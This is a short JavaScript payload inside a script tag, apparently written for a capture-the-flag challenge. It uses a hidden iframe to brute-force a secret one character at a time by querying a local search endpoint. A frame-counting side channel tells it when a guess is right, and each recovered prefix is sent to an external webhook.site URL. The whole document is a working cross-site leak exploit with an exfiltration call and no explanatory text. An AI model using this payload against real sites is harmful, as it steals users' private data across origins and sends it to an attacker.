<script>
(async () => {
    let currentB64 = "REh7";
    let flag = atob(currentB64); 
    
    const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f";
    const iframe = document.createElement("iframe");
    
    iframe.style.display = "none";
    document.body.appendChild(iframe);

    while (!flag.includes("}")) {
        for (let c of "0123456789abcdef}") {
            await new Promise(resolve => {
                iframe.onload = () => {
                    if (iframe.contentWindow.frames.length > 0) {
                        flag += c;
                        new Image().src = `${webhook}?d=${btoa(flag)}`;
                    }
                    resolve();
                };
                iframe.src = `http://127.0.0.1:8000/search?query=${flag}${c}`;
            });
            if (flag.endsWith(c)) break;
        }
    }
})();
</script>
